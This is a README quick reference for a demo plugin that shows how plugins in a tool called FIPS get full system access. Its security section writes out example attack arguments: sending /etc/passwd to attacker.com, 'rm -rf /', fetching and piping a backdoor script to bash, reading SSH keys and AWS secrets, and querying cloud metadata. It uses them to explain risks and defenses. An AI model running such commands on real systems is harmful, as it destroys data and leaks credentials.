# System Callout Plugin - Quick Reference

## What It Does
Demonstrates that FIPS plugins have **FULL SYSTEM ACCESS**:
- Execute system commands
- Read/write files
- Access environment variables
- Make HTTP requests

## Demo Endpoints

### Safe Operations (`/demo/safe`)
```bash
curl http://localhost:8888/demo/safe | jq
```
Returns system date, username, and uptime.

### Dangerous Operations (`/demo/dangerous`)
```bash
curl http://localhost:8888/demo/dangerous | jq
```
Demonstrates:
- Reading environment variables (HOME, USER)
- Reading files (Cargo.toml)
- Making HTTP requests (httpbin.org)

### Command Injection Risk (`/demo/injection`)
```bash
curl http://localhost:8888/demo/injection | jq
```
Shows how directory listing could be exploited.

## Running the Demo

### Automated Demo:
```bash
./scripts/demo_system_callout.sh
```

### Manual Steps:

1. **Build the plugin:**
```bash
cd plugins/system_callout
cargo build --release
```

2. **Start FIPS:**
```bash
cargo run -- -c ./nconfig-test/
```

3. **Test endpoints:**
```bash
curl http://localhost:8888/demo/safe
curl http://localhost:8888/demo/dangerous
curl http://localhost:8888/demo/injection
```

## Plugin Functions

| Function | Purpose | Risk Level |
|----------|---------|------------|
| `SystemCommand` | Execute shell commands | 🔴 CRITICAL |
| `GetEnvVar` | Read environment variables | 🔴 CRITICAL |
| `ReadFile` | Read filesystem files | 🔴 CRITICAL |
| `HttpRequest` | Make HTTP requests | 🔴 CRITICAL |

## Security Implications

### What Attackers Can Do:
1. **Data Exfiltration:**
   ```yaml
   args: ["curl", "http://attacker.com", "-d", "@/etc/passwd"]
   ```

2. **System Destruction:**
   ```yaml
   args: ["rm", "-rf", "/"]
   ```

3. **Backdoor Installation:**
   ```yaml
   args: ["curl", "http://attacker.com/backdoor.sh", "|", "bash"]
   ```

4. **Credential Theft:**
   ```yaml
   args: ["~/.ssh/id_rsa"]  # ReadFile
   args: ["AWS_SECRET_ACCESS_KEY"]  # GetEnvVar
   ```

5. **SSRF Attacks:**
   ```yaml
   args: ["http://169.254.169.254/latest/meta-data/"]  # AWS metadata
   ```

### Real-World Attack Chain:
1. Attacker gains access to configuration files
2. Adds malicious plugin with system callout
3. Executes commands to:
   - Read credentials
   - Exfiltrate data
   - Install backdoor
   - Pivot to other systems

## Defense Strategies

### ✅ DO:
- Run FIPS with minimal privileges
- Use containers/sandboxing
- Audit all plugin configurations
- Implement RBAC for configs
- Monitor process execution
- Log all plugin calls

### ❌ DON'T:
- Use in production without security review
- Allow user input in plugin args
- Run as root/admin
- Load untrusted plugins
- Expose to public networks

## Files

- `src/lib.rs` - Plugin implementation
- `SECURITY.md` - Comprehensive security documentation
- `../../nconfig-test/rule-system-callout-demo.nrule.yml` - Demo configuration
- `../../scripts/demo_system_callout.sh` - Automated demo script

## Learn More

- Full security documentation: `SECURITY.md`
- FIPS README security section: `../../README.md`
- OWASP Command Injection: https://owasp.org/www-community/attacks/Command_Injection
- OWASP SSRF: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/19-Testing_for_Server-Side_Request_Forgery
